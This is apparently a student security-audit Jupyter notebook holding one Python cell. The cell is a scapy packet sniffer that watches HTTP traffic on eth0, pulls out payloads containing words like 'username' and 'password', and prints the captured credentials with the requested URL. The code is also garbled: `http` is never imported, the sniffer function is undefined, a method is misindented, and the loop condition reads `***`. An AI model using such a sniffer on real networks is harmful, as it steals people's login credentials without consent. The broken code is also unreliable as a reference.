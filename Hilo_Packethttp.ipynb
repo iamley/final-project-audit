{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import scapy.all as scapy\n",
    "import subprocess\n",
    "\n",
    "import threading\n",
    "\n",
    "class MiHilo(threading.Thread):\n",
    "    def run(self):\n",
    "        sniffer(\"eth0\")\n",
    "        \n",
    "    def sniffed_packet(packet):\n",
    "    if packet.haslayer(http.HTTPRequest):\n",
    "        ##print(packet[http.HTTPRequest])\n",
    "        credentials = credenciales(packet)\n",
    "        if credentials:\n",
    "            print('Usuario/Passowrd Ingresados ' + str(credentials) + \"\\n\")\n",
    "            url = obt_url(packet)\n",
    "            print('URL ' + str(url) + \"\\n\")\n",
    "\n",
    "    def credenciales(packet):\n",
    "        print('Inicio')\n",
    "        if packet.haslayer(scapy.Raw):\n",
    "            load = str(packet[scapy.Raw].load)\n",
    "            ##print(str(load)) \n",
    "            keywords = [\"email\", \"username\", \"user\", \"login\", \"pass\", \"password\"]\n",
    "            for keyword in keywords:\n",
    "                if keyword in load:\n",
    "                    return load\n",
    "\n",
    "    def obt_url(packet):\n",
    "        return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path    \n",
    "        \n",
    "while ***:\n",
    "    hilo = MiHilo()\n",
    "    hilo.start()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
